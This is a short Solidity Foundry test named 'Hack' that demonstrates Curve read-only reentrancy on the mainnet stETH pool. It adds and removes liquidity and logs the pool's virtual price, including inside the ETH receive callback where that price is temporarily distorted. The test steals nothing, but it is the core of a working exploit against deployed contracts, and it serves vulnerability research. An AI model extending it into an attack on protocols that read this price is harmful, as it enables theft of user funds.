pragma solidity ^0.8.13;

import "forge-std/console.sol";
import "forge-std/Test.sol";
address constant STETH_POOL = 0x6eB2dc694eB516B16Dc9FBc678C60052BbdD7d80;

interface ICurve {
  function get_virtual_price() external view returns (uint);
  function add_liquidity(uint[2] calldata amounts, uint min_mint_amount)
    external
    payable
    returns (uint);

  function remove_liquidity(uint lp, uint[2] calldata min_amounts)
    external
    returns (uint[2] memory);

  function remove_liquidity_one_coin(
    uint lp,
    int128 i,
    uint min_amount
  ) external returns (uint);
}


contract Hack is Test {
   function setUp() public {

   }
   function testLPPrice() public {
     uint256[2] memory amounts = [uint256(1000e18), uint256(0)];
     uint256[2] memory minLps = [uint256(0),uint256(0)];

     console.log("base",ICurve(STETH_POOL).get_virtual_price());

     uint256 lpAmount = ICurve(STETH_POOL).add_liquidity{value:1000e18}(amounts,0);
     console.log("add_liquidity",ICurve(STETH_POOL).get_virtual_price());

     ICurve(STETH_POOL).remove_liquidity(lpAmount,minLps);
     console.log("remove_liquidity",ICurve(STETH_POOL).get_virtual_price());
   }
   receive() external payable {
      console.log("receive",ICurve(STETH_POOL).get_virtual_price());
   }
}




